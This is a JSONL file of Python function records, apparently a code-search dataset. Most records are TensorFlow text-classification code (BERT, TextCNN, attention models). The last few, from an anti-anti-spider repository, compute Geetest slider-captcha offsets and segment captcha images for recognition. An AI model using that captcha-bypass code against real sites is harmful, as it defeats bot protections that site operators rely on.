{"docstring": "\"\"\"\n:param d_model:\n:param d_k:\n:param d_v:\n:param sequence_length:\n:param h:\n:param batch_size:\n:param embedded_words: shape:[batch_size,sequence_length,embed_size]\n\"\"\"\n", "func_signal": "def __init__(self,d_model,d_k,d_v,sequence_length,h,batch_size,num_layer=6,type='encoder',decoder_sent_length=None):\n", "code": "self.d_model=d_model\nself.d_k=d_k\nself.d_v=d_v\nself.sequence_length=sequence_length\nself.h=h\nself.num_layer=num_layer\nself.batch_size=batch_size\nself.type=type\nself.decoder_sent_length=decoder_sent_length", "path": "text_classification/a07_Transformer/a2_base_model.py", "commit_date": "2018-11-16 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Constructs a `BertConfig` from a Python dictionary of parameters.\"\"\"\n", "func_signal": "def from_dict(cls, json_object):\n", "code": "config = BertConfig(vocab_size=None)\nfor (key, value) in six.iteritems(json_object):\n  config.__dict__[key] = value\nreturn config", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "#1.load data(X:list of lint,y:int).\n#if os.path.exists(FLAGS.cache_path):  # \u5982\u679c\u6587\u4ef6\u7cfb\u7edf\u4e2d\u5b58\u5728\uff0c\u90a3\u4e48\u52a0\u8f7d\u6545\u4e8b\uff08\u8bcd\u6c47\u8868\u7d22\u5f15\u5316\u7684\uff09\n#    with open(FLAGS.cache_path, 'r') as data_f:\n#        trainX, trainY, testX, testY, vocabulary_index2word=pickle.load(data_f)\n#        vocab_size=len(vocabulary_index2word)\n#else:\n", "func_signal": "def main(_):\n", "code": "if 1==1:\n    trainX, trainY, testX, testY = None, None, None, None\n    vocabulary_word2index, vocabulary_index2word = create_voabulary(word2vec_model_path=FLAGS.word2vec_model_path,name_scope=\"hierAtten\") #simple='simple'\n    vocab_size = len(vocabulary_word2index)\n    print(\"cnn_model.vocab_size:\",vocab_size)\n    vocabulary_word2index_label,vocabulary_index2word_label = create_voabulary_label(name_scope=\"hierAtten\")\n    if FLAGS.multi_label_flag:\n        FLAGS.traning_data_path='training-data/train-zhihu6-title-desc.txt' #test-zhihu5-only-title-multilabel.txt\n    train, test, _ = load_data_multilabel_new(vocabulary_word2index, vocabulary_word2index_label,multi_label_flag=FLAGS.multi_label_flag,traning_data_path=FLAGS.traning_data_path) #,traning_data_path=FLAGS.traning_data_path\n    trainX, trainY = train\n    testX, testY = test\n    # 2.Data preprocessing.Sequence padding\n    print(\"start padding & transform to one hot...\")\n    trainX = pad_sequences(trainX, maxlen=FLAGS.sequence_length, value=0.)  # padding to max length\n    testX = pad_sequences(testX, maxlen=FLAGS.sequence_length, value=0.)  # padding to max length\n    #with open(FLAGS.cache_path, 'w') as data_f: #save data to cache file, so we can use it next time quickly.\n    #    pickle.dump((trainX,trainY,testX,testY,vocabulary_index2word),data_f)\n    print(\"trainX[0]:\", trainX[0]) #;print(\"trainY[0]:\", trainY[0])\n    # Converting labels to binary vectors\n    print(\"end padding & transform to one hot...\")\n#2.create session.\nconfig=tf.ConfigProto()\nconfig.gpu_options.allow_growth=True\nwith tf.Session(config=config) as sess:\n    #Instantiate Model\n    #num_classes, learning_rate, batch_size, decay_steps, decay_rate,sequence_length,num_sentences,vocab_size,embed_size,\n    #hidden_size,is_training\n    model=HierarchicalAttention(FLAGS.num_classes, FLAGS.learning_rate, FLAGS.batch_size, FLAGS.decay_steps, FLAGS.decay_rate,FLAGS.sequence_length,\n                                   FLAGS.num_sentences,vocab_size,FLAGS.embed_size,FLAGS.hidden_size,FLAGS.is_training,multi_label_flag=FLAGS.multi_label_flag)\n    #Initialize Save\n    saver=tf.train.Saver()\n    if os.path.exists(FLAGS.ckpt_dir+\"checkpoint\"):\n        print(\"Restoring Variables from Checkpoint\")\n        saver.restore(sess,tf.train.latest_checkpoint(FLAGS.ckpt_dir))\n    else:\n        print('Initializing Variables')\n        sess.run(tf.global_variables_initializer())\n        if FLAGS.use_embedding: #load pre-trained word embedding\n            assign_pretrained_word_embedding(sess, vocabulary_index2word, vocab_size, model,word2vec_model_path=FLAGS.word2vec_model_path)\n    curr_epoch=sess.run(model.epoch_step)\n    #3.feed data & training\n    number_of_training_data=len(trainX)\n    print(\"number_of_training_data:\",number_of_training_data)\n    previous_eval_loss=10000\n    best_eval_loss=10000\n    batch_size=FLAGS.batch_size\n    for epoch in range(curr_epoch,FLAGS.num_epochs):\n        loss, acc, counter = 0.0, 0.0, 0\n        for start, end in zip(range(0, number_of_training_data, batch_size),range(batch_size, number_of_training_data, batch_size)):\n            if epoch==0 and counter==0:\n                print(\"trainX[start:end]:\",trainX[start:end])#;print(\"trainY[start:end]:\",trainY[start:end])\n            feed_dict = {model.input_x: trainX[start:end],model.dropout_keep_prob: 0.5}\n            if not FLAGS.multi_label_flag:\n                feed_dict[model.input_y] = trainY[start:end]\n            else:\n                feed_dict[model.input_y_multilabel]=trainY[start:end]\n            curr_loss,curr_acc,_=sess.run([model.loss_val,model.accuracy,model.train_op],feed_dict) #curr_acc--->TextCNN.accuracy\n            loss,counter,acc=loss+curr_loss,counter+1,acc+curr_acc\n            if counter %50==0:\n                print(\"HierAtten_0609drate0.75==>Epoch %d\\tBatch %d\\tTrain Loss:%.3f\\tTrain Accuracy:%.3f\" %(epoch,counter,loss/float(counter),acc/float(counter))) #tTrain Accuracy:%.3f---\u300bacc/float(counter)\n\n            ##VALIDATION VALIDATION VALIDATION PART######################################################################################################\n            if FLAGS.batch_size!=0 and (start%(FLAGS.validate_step*FLAGS.batch_size)==0): #(epoch % FLAGS.validate_every) or  if epoch % FLAGS.validate_every == 0:\n                eval_loss, eval_acc = do_eval(sess, model, testX, testY, batch_size,vocabulary_index2word_label)\n                print(\"validation.part. previous_eval_loss:\", previous_eval_loss,\";current_eval_loss:\", eval_loss)\n                if eval_loss > previous_eval_loss: #if loss is not decreasing\n                    # reduce the learning rate by a factor of 0.5\n                    print(\"HierAtten_0609drate0.75==>validation.part.going to reduce the learning rate.\")\n                    learning_rate1 = sess.run(model.learning_rate)\n                    lrr=sess.run([model.learning_rate_decay_half_op])\n                    learning_rate2 = sess.run(model.learning_rate)\n                    print(\"HierAtten_0609drate0.75==>validation.part.learning_rate1:\", learning_rate1, \" ;learning_rate2:\",learning_rate2)\n                #print(\"HierAtten==>Epoch %d Validation Loss:%.3f\\tValidation Accuracy: %.3f\" % (epoch, eval_loss, eval_acc))\n                else:# loss is decreasing\n                    if eval_loss<best_eval_loss:\n                        print(\"HierAtten_0609drate0.75==>going to save the model.eval_loss:\",eval_loss,\";best_eval_loss:\",best_eval_loss)\n                        # save model to checkpoint\n                        save_path = FLAGS.ckpt_dir + \"model.ckpt\"\n                        saver.save(sess, save_path, global_step=epoch)\n                        best_eval_loss=eval_loss\n                previous_eval_loss = eval_loss\n            ##VALIDATION VALIDATION VALIDATION PART######################################################################################################\n\n        #epoch increment\n        print(\"going to increment epoch counter....\")\n        sess.run(model.epoch_increment)\n\n        # 4.validation\n        print(epoch,FLAGS.validate_every,(epoch % FLAGS.validate_every==0))\n        if epoch % FLAGS.validate_every==0:\n            eval_loss, eval_acc=do_eval(sess,model,testX,testY,batch_size,vocabulary_index2word_label)\n            print(\"HierAtten==>Epoch %d Validation Loss:%.3f\\tValidation Accuracy: %.3f\" % (epoch,eval_loss,eval_acc))\n            #save model to checkpoint\n            save_path=FLAGS.ckpt_dir+\"model.ckpt\"\n            saver.save(sess,save_path,global_step=epoch)\n\n    # 5.\u6700\u540e\u5728\u6d4b\u8bd5\u96c6\u4e0a\u505a\u6d4b\u8bd5\uff0c\u5e76\u62a5\u544a\u6d4b\u8bd5\u51c6\u786e\u7387 Test\n    test_loss, test_acc = do_eval(sess, model, testX, testY, batch_size,vocabulary_index2word_label)\npass", "path": "text_classification/a05_HierarchicalAttentionNetwork/p1_HierarchicalAttention_train.py", "commit_date": "2018-04-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"\nget input mask and segment ids given a batch of input x.\nif sequence length of input x is max_sequence_length, then shape of both input_mask and segment_ids should be\n[batch_size, max_sequence_length]. for those padding tokens, input_mask will be zero, value for all other place is one.\n:param train_x_batch:\n:return: input_mask_,segment_ids\n\"\"\"\n", "func_signal": "def get_input_mask_segment_ids(train_x_batch,cls_id):\n", "code": "batch_size,max_sequence_length=train_x_batch.shape\ninput_mask=np.ones((batch_size,max_sequence_length),dtype=np.int32)\n# set 0 for token in padding postion\nfor i in range(batch_size):\n    input_x_=train_x_batch[i] # a list, length is max_sequence_length\n    input_x=list(input_x_)\n    for j in range(len(input_x)):\n        if input_x[j]==0:\n            input_mask[i][j:]=0\n            break\n# insert CLS token for classification\ninput_ids=np.zeros((batch_size,max_sequence_length),dtype=np.int32)\n#print(\"input_ids.shape1:\",input_ids.shape)\nfor k in range(batch_size):\n    input_id_list=list(train_x_batch[k])\n    input_id_list.insert(0,cls_id)\n    del input_id_list[-1]\n    input_ids[k]=input_id_list\n#print(\"input_ids.shape2:\",input_ids.shape)\n\nsegment_ids=np.ones((batch_size,max_sequence_length),dtype=np.int32)\nreturn input_mask, segment_ids,input_ids", "path": "text_classification/a00_Bert/train_bert_multi-label.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Raises an exception if the tensor rank is not of the expected rank.\n\nArgs:\n  tensor: A tf.Tensor to check the rank of.\n  expected_rank: Python integer or list of integers, expected rank.\n  name: Optional name of the tensor for the error message.\n\nRaises:\n  ValueError: If the expected shape doesn't match the actual shape.\n\"\"\"\n", "func_signal": "def assert_rank(tensor, expected_rank, name=None):\n", "code": "if name is None:\n  name = tensor.name\n\nexpected_rank_dict = {}\nif isinstance(expected_rank, six.integer_types):\n  expected_rank_dict[expected_rank] = True\nelse:\n  for x in expected_rank:\n    expected_rank_dict[x] = True\n\nactual_rank = tensor.shape.ndims\nif actual_rank not in expected_rank_dict:\n  scope_name = tf.get_variable_scope().name\n  raise ValueError(\n      \"For the tensor `%s` in scope `%s`, the actual rank \"\n      \"`%d` (shape = %s) is not equal to the expected rank `%s`\" %\n      (name, scope_name, actual_rank, str(tensor.shape), str(expected_rank)))", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Gaussian Error Linear Unit.\n\nThis is a smoother version of the RELU.\nOriginal paper: https://arxiv.org/abs/1606.08415\n\nArgs:\n  input_tensor: float Tensor to perform activation.\n\nReturns:\n  `input_tensor` with the GELU activation applied.\n\"\"\"\n", "func_signal": "def gelu(input_tensor):\n", "code": "cdf = 0.5 * (1.0 + tf.erf(input_tensor / tf.sqrt(2.0)))\nreturn input_tensor * cdf", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Perform dropout.\n\nArgs:\n  input_tensor: float Tensor.\n  dropout_prob: Python float. The probability of dropping out a value (NOT of\n    *keeping* a dimension as in `tf.nn.dropout`).\n\nReturns:\n  A version of `input_tensor` with dropout applied.\n\"\"\"\n", "func_signal": "def dropout(input_tensor, dropout_prob):\n", "code": "if dropout_prob is None or dropout_prob == 0.0:\n  return input_tensor\n\noutput = tf.nn.dropout(input_tensor, 1.0 - dropout_prob)\nreturn output", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Create 3D attention mask from a 2D tensor mask.\n\nArgs:\n  from_tensor: 2D or 3D Tensor of shape [batch_size, from_seq_length, ...].\n  to_mask: int32 Tensor of shape [batch_size, to_seq_length].\n\nReturns:\n  float Tensor of shape [batch_size, from_seq_length, to_seq_length].\n\"\"\"\n", "func_signal": "def create_attention_mask_from_input_mask(from_tensor, to_mask):\n", "code": "from_shape = get_shape_list(from_tensor, expected_rank=[2, 3])\nbatch_size = from_shape[0]\nfrom_seq_length = from_shape[1]\n\nto_shape = get_shape_list(to_mask, expected_rank=2)\nto_seq_length = to_shape[1]\n\nto_mask = tf.cast(\n    tf.reshape(to_mask, [batch_size, 1, to_seq_length]), tf.float32)\n\n# We don't assume that `from_tensor` is a mask (although it could be). We\n# don't actually care if we attend *from* padding tokens (only *to* padding)\n# tokens so we create a tensor of all ones.\n#\n# `broadcast_ones` = [batch_size, from_seq_length, 1]\nbroadcast_ones = tf.ones(\n    shape=[batch_size, from_seq_length, 1], dtype=tf.float32)\n\n# Here we broadcast along two dimensions to create the mask.\nmask = broadcast_ones * to_mask\n\nreturn mask", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Run layer normalization on the last dimension of the tensor.\"\"\"\n", "func_signal": "def layer_norm(input_tensor, name=None):\n", "code": "return tf.contrib.layers.layer_norm(\n    inputs=input_tensor, begin_norm_axis=-1, begin_params_axis=-1, scope=name)", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "#print(\"get_label_using_logits.shape:\", logits_batch.shape) # (10, 1999))=[batch_size,num_labels]===>\u9700\u8981(10,5)\n", "func_signal": "def get_label_using_logits_batch(question_id_sublist,logits_batch,vocabulary_index2word_label,f,top_number=5):\n", "code": "for i,logits in enumerate(logits_batch):\n    index_list=np.argsort(logits)[-top_number:] #print(\"sum_p\", np.sum(1.0 / (1 + np.exp(-logits))))\n    index_list=index_list[::-1]\n    label_list=[]\n    for index in index_list:\n        label=vocabulary_index2word_label[index]\n        label_list.append(label) #('get_label_using_logits.label_list:', [u'-3423450385060590478', u'2838091149470021485', u'-3174907002942471215', u'-1812694399780494968', u'6815248286057533876'])\n    #print(\"get_label_using_logits.label_list\",label_list)\n    write_question_id_with_labels(question_id_sublist[i], label_list, f)\nf.flush()\n#return label_list", "path": "text_classification/a08_EntityNetwork/a3_predict.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Reshapes a >= rank 2 tensor to a rank 2 tensor (i.e., a matrix).\"\"\"\n", "func_signal": "def reshape_to_matrix(input_tensor):\n", "code": "ndims = input_tensor.shape.ndims\nif ndims < 2:\n  raise ValueError(\"Input tensor must have at least rank 2. Shape = %s\" %\n                   (input_tensor.shape))\nif ndims == 2:\n  return input_tensor\n\nwidth = input_tensor.shape[-1]\noutput_tensor = tf.reshape(input_tensor, [-1, width])\nreturn output_tensor", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Creates a classification model.\"\"\"\n", "func_signal": "def create_model(bert_config, is_training, input_ids, input_mask, segment_ids,labels, num_labels, use_one_hot_embeddings,reuse_flag=False):\n", "code": "model = modeling.BertModel(\n    config=bert_config,\n    is_training=is_training,\n    input_ids=input_ids,\n    input_mask=input_mask,\n    token_type_ids=segment_ids,\n    use_one_hot_embeddings=use_one_hot_embeddings)\n\noutput_layer = model.get_pooled_output()\nhidden_size = output_layer.shape[-1].value\nwith tf.variable_scope(\"weights\",reuse=reuse_flag):\n    output_weights = tf.get_variable(\"output_weights\", [num_labels, hidden_size],initializer=tf.truncated_normal_initializer(stddev=0.02))\n    output_bias = tf.get_variable(\"output_bias\", [num_labels], initializer=tf.zeros_initializer())\n\nwith tf.variable_scope(\"loss\"):\n  #if is_training:\n  #    print(\"###create_model.is_training:\",is_training)\n  #    output_layer = tf.nn.dropout(output_layer, keep_prob=0.9)\n  def apply_dropout_last_layer(output_layer):\n      output_layer = tf.nn.dropout(output_layer, keep_prob=0.9)\n      return output_layer\n\n  def not_apply_dropout(output_layer):\n      return output_layer\n\n  output_layer=tf.cond(is_training, lambda: apply_dropout_last_layer(output_layer), lambda:not_apply_dropout(output_layer))\n  logits = tf.matmul(output_layer, output_weights, transpose_b=True)\n  print(\"output_layer:\",output_layer.shape,\";output_weights:\",output_weights.shape,\";logits:\",logits.shape) # shape=(?, 1999)\n\n  logits = tf.nn.bias_add(logits, output_bias)\n  probabilities = tf.nn.sigmoid(logits) #tf.nn.softmax(logits, axis=-1)\n  per_example_loss=tf.nn.sigmoid_cross_entropy_with_logits(labels=labels, logits=logits) # shape=(?, 1999)\n  loss_batch = tf.reduce_sum(per_example_loss,axis=1)  #  (?,)\n  loss=tf.reduce_mean(loss_batch) #  (?,)\n\n  return loss, per_example_loss, logits, probabilities,model", "path": "text_classification/a00_Bert/train_bert_multi-label.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "# 1.load data with vocabulary of words and labels\n", "func_signal": "def main(_):\n", "code": "vocabulary_word2index, vocabulary_index2word = create_voabulary(word2vec_model_path=FLAGS.word2vec_model_path,name_scope=\"entity_network\")\nvocab_size = len(vocabulary_word2index)\nvocabulary_word2index_label, vocabulary_index2word_label = create_voabulary_label(name_scope=\"entity_network\")\nquestionid_question_lists=load_final_test_data(FLAGS.predict_source_file)\ntest= load_data_predict(vocabulary_word2index,vocabulary_word2index_label,questionid_question_lists)\ntestX=[]\nquestion_id_list=[]\nfor tuple in test:\n    question_id,question_string_list=tuple\n    question_id_list.append(question_id)\n    testX.append(question_string_list)\n# 2.Data preprocessing: Sequence padding\nprint(\"start padding....\")\ntestX2 = pad_sequences(testX, maxlen=FLAGS.sequence_length, value=0.)  # padding to max length\nprint(\"end padding...\")", "path": "text_classification/a08_EntityNetwork/a3_predict.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"\nload data from h5py and pickle cache files, which is generate by take step by step of pre-processing.ipynb\n:param cache_file_h5py:\n:param cache_file_pickle:\n:return:\n\"\"\"\n", "func_signal": "def load_data(cache_file_h5py,cache_file_pickle):\n", "code": "if not os.path.exists(cache_file_h5py) or not os.path.exists(cache_file_pickle):\n    raise RuntimeError(\"############################ERROR##############################\\n. \"\n                       \"please download cache file, it include training data and vocabulary & labels. \"\n                       \"link can be found in README.md\\n download zip file, unzip it, then put cache files as FLAGS.\"\n                       \"cache_file_h5py and FLAGS.cache_file_pickle suggested location.\")\nprint(\"INFO. cache file exists. going to load cache file\")\nf_data = h5py.File(cache_file_h5py, 'r')\nprint(\"f_data.keys:\",list(f_data.keys()))\ntrain_X=f_data['train_X'] # np.array(\nprint(\"train_X.shape:\",train_X.shape)\ntrain_Y=f_data['train_Y'] # np.array(\nprint(\"train_Y.shape:\",train_Y.shape,\";\")\nvaild_X=f_data['vaild_X'] # np.array(\nvalid_Y=f_data['valid_Y'] # np.array(\ntest_X=f_data['test_X'] # np.array(\ntest_Y=f_data['test_Y'] # np.array(\n#f_data.close()\n\nword2index, label2index=None,None\nwith open(cache_file_pickle, 'rb') as data_f_pickle:\n    word2index, label2index=pickle.load(data_f_pickle)\nprint(\"INFO. cache file load successful...\")\nreturn word2index, label2index,train_X,train_Y,vaild_X,valid_Y,test_X,test_Y", "path": "text_classification/a02_TextCNN/p7_TextCNN_predict.py", "commit_date": "2018-11-18 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Maps a string to a Python function, e.g., \"relu\" => `tf.nn.relu`.\n\nArgs:\n  activation_string: String name of the activation function.\n\nReturns:\n  A Python function corresponding to the activation function. If\n  `activation_string` is None, empty, or \"linear\", this will return None.\n  If `activation_string` is not a string, it will return `activation_string`.\n\nRaises:\n  ValueError: The `activation_string` does not correspond to a known\n    activation.\n\"\"\"\n\n# We assume that anything that\"s not a string is already an activation\n# function, so we just return it.\n", "func_signal": "def get_activation(activation_string):\n", "code": "if not isinstance(activation_string, six.string_types):\n  return activation_string\n\nif not activation_string:\n  return None\n\nact = activation_string.lower()\nif act == \"linear\":\n  return None\nelif act == \"relu\":\n  return tf.nn.relu\nelif act == \"gelu\":\n  return gelu\nelif act == \"tanh\":\n  return tf.tanh\nelse:\n  raise ValueError(\"Unsupported activation: %s\" % act)", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Runs layer normalization followed by dropout.\"\"\"\n", "func_signal": "def layer_norm_and_dropout(input_tensor, dropout_prob, name=None):\n", "code": "output_tensor = layer_norm(input_tensor, name)\noutput_tensor = dropout(output_tensor, dropout_prob)\nreturn output_tensor", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "# 1.load data with vocabulary of words and labels\n", "func_signal": "def main(_):\n", "code": "vocabulary_word2index, vocabulary_index2word = create_voabulary(simple='simple',word2vec_model_path=FLAGS.word2vec_model_path,name_scope=\"cnn2\")\nvocab_size = len(vocabulary_word2index)\nvocabulary_word2index_label, vocabulary_index2word_label = create_voabulary_label(name_scope=\"cnn2\")\nquestionid_question_lists=load_final_test_data(FLAGS.predict_source_file)\ntest= load_data_predict(vocabulary_word2index,vocabulary_word2index_label,questionid_question_lists)\ntestX=[]\nquestion_id_list=[]\nfor tuple in test:\n    question_id,question_string_list=tuple\n    question_id_list.append(question_id)\n    testX.append(question_string_list)\n# 2.Data preprocessing: Sequence padding\nprint(\"start padding....\")\ntestX2 = pad_sequences(testX, maxlen=FLAGS.sentence_len, value=0.)  # padding to max length\nprint(\"end padding...\")", "path": "text_classification/a02_TextCNN/other_experiement/p7_TextCNN_predict_exp512.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"\nevalution on model using validation data\n\"\"\"\n", "func_signal": "def do_eval(sess,input_ids,input_mask,segment_ids,label_ids,is_training,loss,probabilities,vaildX, vaildY, num_labels,batch_size,cls_id):\n", "code": "num_eval=1000\nvaildX = vaildX[0:num_eval]\nvaildY = vaildY[0:num_eval]\nnumber_examples = len(vaildX)\neval_loss, eval_counter, eval_f1_score, eval_p, eval_r = 0.0, 0, 0.0, 0.0, 0.0\nlabel_dict = init_label_dict(num_labels)\nprint(\"do_eval.number_examples:\",number_examples)\nf1_score_micro_sklearn_total=0.0\n# batch_size=1 # TODO\nfor start, end in zip(range(0, number_examples, batch_size), range(batch_size, number_examples, batch_size)):\n    input_mask_, segment_ids_, input_ids_ = get_input_mask_segment_ids(vaildX[start:end],cls_id)\n    feed_dict = {input_ids: input_ids_,input_mask:input_mask_,segment_ids:segment_ids_,\n                 label_ids:vaildY[start:end],is_training:False}\n    curr_eval_loss, prob = sess.run([loss, probabilities],feed_dict)\n    target_labels=get_target_label_short_batch(vaildY[start:end])\n    predict_labels=get_label_using_logits_batch(prob)\n    if start%100==0:\n        print(\"prob.shape:\",prob.shape,\";prob:\",prob)\n        print(\"predict_labels:\",predict_labels)\n\n    #print(\"predict_labels:\",predict_labels)\n    label_dict=compute_confuse_matrix_batch(target_labels,predict_labels,label_dict,name='bert')\n    eval_loss, eval_counter = eval_loss + curr_eval_loss, eval_counter + 1\n\nf1_micro, f1_macro = compute_micro_macro(label_dict)  # label_dictis a dict, key is: accusation,value is: (TP,FP,FN). where TP is number of True Positive\nf1_score_result = (f1_micro + f1_macro) / 2.0\nreturn eval_loss / float(eval_counter+0.00001), f1_score_result, f1_micro, f1_macro", "path": "text_classification/a00_Bert/train_bert_multi-label.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"\u8ba1\u7b97\u6ed1\u5757\u504f\u79fb\u4f4d\u7f6e\uff0c\u5fc5\u987b\u5728\u70b9\u51fb\u67e5\u8be2\u6309\u94ae\u4e4b\u540e\u8c03\u7528\n\n:returns: Number\n\n\"\"\"\n", "func_signal": "def calculate_slider_offset(self):\n", "code": "img1 = self.crop_captcha_image()\nself.drag_and_drop(x_offset=5)\nimg2 = self.crop_captcha_image()\nw1, h1 = img1.size\nw2, h2 = img2.size\nif w1 != w2 or h1 != h2:\n    return False\nleft = 0\nflag = False\nfor i in xrange(45, w1):\n    for j in xrange(h1):\n        if not self.is_pixel_equal(img1, img2, i, j):\n            left = i\n            flag = True\n            break\n    if flag:\n        break\nif left == 45:\n    left -= 2\nreturn left", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/5.\u6781\u9a8c\u9a8c\u8bc1\u7801\u8d44\u6e90\u6c47\u603b/\u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u7834\u89e3/geetest.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "\"\"\"\u70b9\u51fb\u67e5\u8be2\u6309\u94ae\n\n:element_id: \u67e5\u8be2\u6309\u94ae\u7f51\u9875\u5143\u7d20id\n\n\"\"\"\n", "func_signal": "def click_by_id(self, element_id=\"u85\"):\n", "code": "search_el = self.driver.find_element_by_id(element_id)\nsearch_el.click()\ntime.sleep(3.5)", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/5.\u6781\u9a8c\u9a8c\u8bc1\u7801\u8d44\u6e90\u6c47\u603b/\u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u7834\u89e3/geetest.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "#\u9009\u62e9\u5668\u83b7\u53d6\u9875\u9762\u6e90\u7801,\n", "func_signal": "def parse(self, response):\n", "code": "sel = Selector(response)\n#\u4f7f\u7528xparh\u8fdb\u884c\u7b5b\u9009,\u9009\u53d6\u6240\u6709div\u4e2did\u4e3anavsecond\u7684\u5c42\u6240\u5305\u542b\u7684\u6240\u6709div\u4e2did\u4e3acourse\u7684ul\u4e2dul\u6807\u7b7e\u4e0b\u7684,li\u6807\u7b7e\u5185\u5bb9,\nsites = sel.xpath('//div[@id=\"navsecond\"]/div[@id=\"course\"]/ul[1]/li')\n\n#\u5b9a\u4e49\u4e00\u4e2aitems\u5bb9\u5668\nitems = []\n#site\u7684\u5185\u5bb9\u5305\u62echref\u4e3a\u94fe\u63a5,title\u4e3a\u6807\u9898,\nfor site in sites:\n    #\u6210\u4e3aie\u4e00\u4e2aitem\u7684\u5b57\u5178\u7c7b\u578b\n    item = W3schoolItem()\n    #\u5bf9\u6bcf\u4e00\u4e2asite\u4f7f\u7528xpath\u62bd\u53d6\u51faa\u6807\u7b7e\u5185\u7684text,href,title.\n    title = site.xpath('a/text()').extract()\n    link = site.xpath('a/@href').extract()\n    desc = site.xpath('a/@title').extract()\n\n    item['title'] = [t.encode('utf-8') for t in title]\n    item['link'] = [l.encode('utf-8') for l in link]\n    item['desc'] = [d.encode('utf-8') for d in desc]\n    #\u5728\u5217\u8868\u4e2d\u52a0\u5165\u8fd9\u4e2a\u5b57\u5178\n    items.append(item)\n\n    #\u8bb0\u5f55\n    log.msg(\"Appending item...\",level='INFO')\n\n\nlog.msg(\"Append done.\",level='INFO')\nreturn items", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/w3school/w3school/spiders/w3cshool_spider.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "''' \u5b57\u7b26\u5207\u5272,\u6839\u636e\u9ed1\u8272\u7684\u8fde\u7eed\u6027,\u5f53\u67d0\u4e00\u5217\u51fa\u73b0\u9ed1\u8272\u4e3a\u6807\u5fd7,\u5f53\u9ed1\u8272\u6d88\u5931\u4e3a\u7ed3\u675f\u70b9'''\n", "func_signal": "def cut_image(image):\n", "code": "inletter=False\nfoundletter=False\nletters=[]\nstart=0\nend=0\nfor x in range(image.size[0]):\n    for y in range(image.size[1]):\n        pix=image.getpixel((x,y))\n        if(pix==0):\n            inletter=True\n    if foundletter==False and inletter ==True:\n        foundletter=True\n        start=x\n    if foundletter==True and inletter==False:\n        end=x\n        letters.append((start,end))\n        foundletter=False\n    inletter=False\nimages=[]\nfor letter in letters:\n    img=image.crop((letter[0],0,letter[1],image.size[1]))\n    #img.save(str(letter[0])+'.jpeg')#\u5c55\u793a\u5207\u5272\u6548\u679c\n    images.append(img)\nreturn images", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/1.\u9a8c\u8bc1\u7801/knn_num_captcha/recognise.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
